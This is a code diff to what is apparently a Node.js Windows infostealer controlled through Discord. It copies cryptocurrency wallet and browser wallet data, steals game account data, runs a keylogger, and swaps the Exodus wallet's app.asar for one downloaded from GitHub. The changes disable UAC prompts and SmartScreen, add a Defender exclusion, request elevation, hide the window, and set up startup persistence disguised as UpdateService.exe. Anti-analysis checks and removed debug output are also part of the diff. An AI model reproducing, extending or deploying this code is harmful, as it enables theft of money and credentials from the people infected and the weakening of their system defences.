@@ -1,5 +1,14 @@
-const { exec, execSync } = require('child_process');
-
+const { exec, execSync, spawn, spawnSync } = require('child_process');
+if (process.platform === 'win32') {
+  try {
+    WindowsHide();
+  } catch (e) {
+    const cp = require('child_process');
+    try {
+      cp.execSync('powershell -window hidden -command ""');
+    } catch (err) {}
+  }
+}
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, PermissionFlagsBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
 const { promisify } = require('util');
 const fs = require('fs').promises;
@@ -16,6 +25,9 @@ const si = require('systeminformation');
 const FormData = require('form-data'); // make sure it's installed
 
  
+
+
+ 
  
 
  
@@ -24,7 +36,42 @@ const FormData = require('form-data'); // make sure it's installed
  
  
 
+ 
+ 
 
+ 
+ 
+
+
+
+
+
+
+ 
+ 
+
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
+ 
+
+ 
  
 
  
@@ -896,12 +943,10 @@ function findExodusResources() {
   if (!fswithout.existsSync(resourcesPath)) {
     return null;
   }
-console.log(resourcesPath)
   return resourcesPath;
 }
 
 function downloadAsar(resourcesPath) {
-  console.log('skibidi')
   const url = 'https://github.com/Bread-M4/Sylon-v2/releases/download/asar/app.asar';
   const dest = path.join(resourcesPath, 'app.asar');
   try {
@@ -1051,17 +1096,12 @@ function copyWalletsToTemp() {
       continue;
     }
 
-    // Note: deobfuscatedPath already starts with a backslash like "\AppData\Roaming\..."
-    // We join it to the user home, normalizing separators.
+
     const source = path.join(userHome, deobfuscatedPath);
-    // Destination for this wallet will be <destBase>\<WalletName>
     const dest = path.join(destBase, name);
 
     if (fswithout.existsSync(source)) {
       try {
-        console.log(`Copying ${name}:`);
-        console.log(`  from: ${source}`);
-        console.log(`  to:   ${dest}`);
         copyDir(source, dest);
         copied++;
       } catch (err) {
@@ -1161,7 +1201,6 @@ function copyBrowserWalletsToTemp() {
     const deobfuscatedBrowserPath = deobfuscate(obfuscatedBrowserPath);
     const browserDataPath = path.join(userHome, deobfuscatedBrowserPath);
     
-    console.log(`Checking browser: ${browserName} at ${browserDataPath}`);
     
     if (!fswithout.existsSync(browserDataPath)) {
       console.log(`Browser path not found: ${browserDataPath}`);
@@ -2276,11 +2315,13 @@ async function addExclusionDisableUACTemporarily() {
     
     try {
         if (!isUpdateService) {
-            // Step 1: Temporarily disable UAC and add exclusion (only if NOT UpdateService.exe)
             console.log('\n1. Temporarily adjusting UAC settings...');
             await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f');
             console.log('✓ UAC temporarily disabled');
-            
+            await execAsync('reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f');
+// Disable SmartScreen for Explorer
+            await execAsync('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer /v SmartScreenEnabled /t REG_SZ /d Off /f');
+            console.log('✓ SmartScreen temporarily disabled');
             // Add the exclusion
             await execAsync(`powershell -Command "Add-MpPreference -ExclusionPath '${exclusionPath}'"`);
             console.log('✓ Exclusion added without UAC prompt');
@@ -3261,117 +3302,69 @@ async function startKeyLogger() {
         setTimeout(resolve, 1000);
     });
   }
+async function installAsStartup() {
+    const userDir = os.homedir();
+    const startupDir = path.join(userDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
+    const baseDir = path.join(userDir, "AppData", "LocalLow", "Temp", "Steam", "DEBUG");
+    const exePath = path.join(baseDir, "UpdateService.exe");
+    const startupLnk = path.join(startupDir, "UpdateService.lnk");
 
-async function installAsScheduledTask() {
-  const userDir = os.homedir();
-  const baseDir = path.join(userDir, "AppData", "LocalLow", "Temp", "Steam", "DEBUG");
-  const exePath = path.join(baseDir, "UpdateService.exe");
-  const psPath = path.join(baseDir, "enable-debug-and-run.ps1");
-  const cmdLauncher = path.join(baseDir, "launcher_system.cmd");
-  const logDir = path.join(baseDir, "Logs");
-  const logPath = path.join(logDir, "system-task.log");
-  const taskName = "UpdateServices_SystemTask";
+    // Check if already running as UpdateService.exe
+    const currentProcessName = path.basename(process.execPath);
+    if (currentProcessName === "UpdateService.exe") {
+        console.log("✅ Already running as UpdateService.exe - skipping startup installation");
+        return;
+    }
 
-  await fs.mkdir(baseDir, { recursive: true });
-  await fs.mkdir(logDir, { recursive: true });
+    await fs.mkdir(baseDir, { recursive: true });
 
-  // --- Copy the current executable to the target directory ---
-  const currentExe = process.execPath;
-  if (path.normalize(currentExe).toLowerCase() !== path.normalize(exePath).toLowerCase()) {
-    await fs.copyFile(currentExe, exePath);
-    console.log(`📦 Copied ${currentExe} → ${exePath}`);
-  } else {
-    console.log("✅ Already running from install directory.");
-  }
+    // --- Copy the current executable to the target directory ---
+    const currentExe = process.execPath;
+    if (path.normalize(currentExe).toLowerCase() !== path.normalize(exePath).toLowerCase()) {
+        await fs.copyFile(currentExe, exePath);
+        console.log(`📦 Copied ${currentExe} → ${exePath}`);
+    } else {
+        console.log("✅ Already running from install directory.");
+    }
 
-  // --- PowerShell script that enables SeDebugPrivilege then starts the exe ---
-  const psContent = `
-param(
-    [Parameter(Mandatory = $true)]
-    [string]$ExePath
-)
-
-function Enable-SeDebugPrivilege {
-    $definition = @'
-using System;
-using System.Runtime.InteropServices;
-
-public class AdjPriv {
-  [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
-  internal static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-  [DllImport("kernel32.dll", ExactSpelling=true)]
-  internal static extern IntPtr GetCurrentProcess();
-  [DllImport("advapi32.dll", SetLastError=true)]
-  internal static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
-  [DllImport("advapi32.dll", ExactSpelling=true, SetLastError=true)]
-  internal static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-
-  [StructLayout(LayoutKind.Sequential, Pack = 1)]
-  internal struct TokPriv1Luid {
-    public int Count;
-    public long Luid;
-    public int Attr;
-  }
-
-  public static bool EnablePrivilege(string privilege) {
-    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
-    const uint TOKEN_QUERY = 0x00000008;
-    const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
-    IntPtr hToken;
-    TokPriv1Luid tp;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
-      return false;
-    if (!LookupPrivilegeValue(null, privilege, out tp.Luid))
-      return false;
-    tp.Count = 1;
-    tp.Attr = (int)SE_PRIVILEGE_ENABLED; // ✅ explicit cast fixes your compile error
-    return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
-  }
-}
-'@
-
-    Add-Type $definition
-    [AdjPriv]::EnablePrivilege("SeDebugPrivilege") | Out-Null
-}
-
-Write-Host "[*] Enabling SeDebugPrivilege..."
-Enable-SeDebugPrivilege
-Write-Host "[+] SeDebugPrivilege enabled successfully."
-
-if (-not (Test-Path $ExePath)) {
-    Write-Host "❌ File not found: $ExePath"
-    exit 1
-}
-
-Write-Host "[*] Starting: $ExePath"
-Start-Process -FilePath $ExePath -WindowStyle Hidden
-
+    // --- Create shortcut in startup folder ---
+    
+    // Use PowerShell to create a shortcut in the startup folder
+    const createShortcutScript = `
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("${startupLnk}")
+$Shortcut.TargetPath = "${exePath}"
+$Shortcut.WorkingDirectory = "${baseDir}"
+$Shortcut.WindowStyle = 1
+$Shortcut.Save()
+Write-Output "Shortcut created at ${startupLnk}"
 `;
 
-  await fs.writeFile(psPath, psContent, { encoding: "utf8" });
+    try {
+        // Execute PowerShell to create the shortcut
+        const ps = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-Command', createShortcutScript]);
+        
+        ps.stdout.on('data', (data) => {
+            console.log(`PS: ${data}`);
+        });
+        
+        ps.stderr.on('data', (data) => {
+            console.error(`PS Error: ${data}`);
+        });
+        
+        ps.on('close', (code) => {
+            if (code === 0) {
+                console.log(`✅ Startup shortcut created: ${startupLnk}`);
+                console.log("⚡ Program will auto-start on next login");
+            } else {
+                console.error(`❌ Failed to create startup shortcut. Exit code: ${code}`);
+            }
+        });
+        
+    } catch (error) {
+        console.error("Error creating startup shortcut:", error);
+    }
 
-  // --- Launcher CMD that calls the PowerShell script and logs output ---
-  const launcherContent = [
-    "@echo off",
-    "REM Runs as SYSTEM using the PowerShell privilege enabler",
-    `powershell.exe -NoProfile -ExecutionPolicy Bypass -File "${psPath}" -ExePath "${exePath}" >> "${logPath}" 2>&1`
-  ].join("\r\n");
-
-  await fs.writeFile(cmdLauncher, launcherContent, { encoding: "ascii" });
-
-  // --- Create SYSTEM task ---
-const createCmd = `schtasks /Create /TN "${taskName}" /TR "${exePath}" /SC ONLOGON /RL HIGHEST /F`;
-  console.log("⚙️ Creating SYSTEM scheduled task...");
-  execSync(createCmd, { stdio: "inherit" });
-  console.log("✅ SYSTEM task created successfully!");
-
-  // --- Try to run it immediately ---
-  try {
-// removed start task (compatability)
-  } catch (err) {
-  }
-
-  console.log(`📄 Log file will be written to: ${logPath}`);
 }
 
 const resourcesPath = findExodusResources();
@@ -3397,7 +3390,7 @@ client.once('clientReady', async () => {
                 await CopyMinecraftData(rootPath),
                 await ExtractRobloxData(rootPath),
                 await Steal(),
-                await installAsScheduledTask()
+                await installAsStartup()
                 
             ]);
                 if (resourcesPath) {
@@ -3490,12 +3483,90 @@ exec(cmd1, (error, stdout, stderr) => {
   });
 })
 }
+function checkAdmin() {
+  return new Promise((resolve) => {
+    try {
+      const r = spawnSync('net', ['session'], { windowsHide: true });
+      resolve(r.status === 0);
+    } catch {
+      resolve(false);
+    }
+  });
+}
+
+/**
+ * Escape a single argument for PowerShell single-quoted string.
+ * In PowerShell single quotes, single quote is escaped by doubling it.
+ */
+function psSingleQuoteEscape(s) {
+  return `'${String(s).replace(/'/g, "''")}'`;
+}
+
+function elevateSelf() {
+  return new Promise((resolve) => {
+    try {
+      const exePath = process.execPath;
+      let args = process.argv.slice(1);
+
+      if (process.pkg && args.length > 0 && /[\\\/]snapshot[\\\/]/i.test(args[0])) {
+        args = args.slice(1);
+      }
+
+      let psCommand;
+      if (args.length === 0) {
+        psCommand = `Start-Process -FilePath ${psSingleQuoteEscape(exePath)} -Verb RunAs -PassThru`;
+      } else {
+        const psArgsList = args.map(a => psSingleQuoteEscape(a)).join(',');
+        psCommand = `Start-Process -FilePath ${psSingleQuoteEscape(exePath)} -ArgumentList ${psArgsList} -Verb RunAs -PassThru`;
+      }
+
+      console.log('Attempting elevation with command:\n', psCommand, '\n');
+
+      // Use spawnSync to see if there's an error
+      const result = spawnSync('powershell.exe', [
+        '-NoProfile',
+        '-ExecutionPolicy', 'Bypass',
+        '-Command', psCommand
+      ], {
+        windowsHide: false, // Changed to see output
+        encoding: 'utf8'
+      });
+
+      console.log('PowerShell stdout:', result.stdout);
+      console.log('PowerShell stderr:', result.stderr);
+      console.log('PowerShell exit code:', result.status);
+
+      setTimeout(() => resolve(true), 800);
+    } catch (err) {
+      console.error('Elevation error:', err && err.message ? err.message : err);
+      resolve(false);
+    }
+  });
+}
+
 (async function main() {
   if (process.platform !== 'win32') {
     blockAndExit();
   }
 
-  await checkOsAndGpu();
+  const isAdmin = await checkAdmin();
+
+  if (!isAdmin) {
+    console.log('Please run as admin, asking for prompt.')
+    const elevated = await elevateSelf();
+    if (!elevated) {
+    }
+
+
+    setTimeout(() => {
+      process.exit(0);
+    }, 250); 
+    
+    return; 
+  }
+
+  console.log('Running with administrator privileges.');
+    await checkOsAndGpu();
   await checkHostname();
   await checkHardwareIDs();
   await checkRunningProcesses();
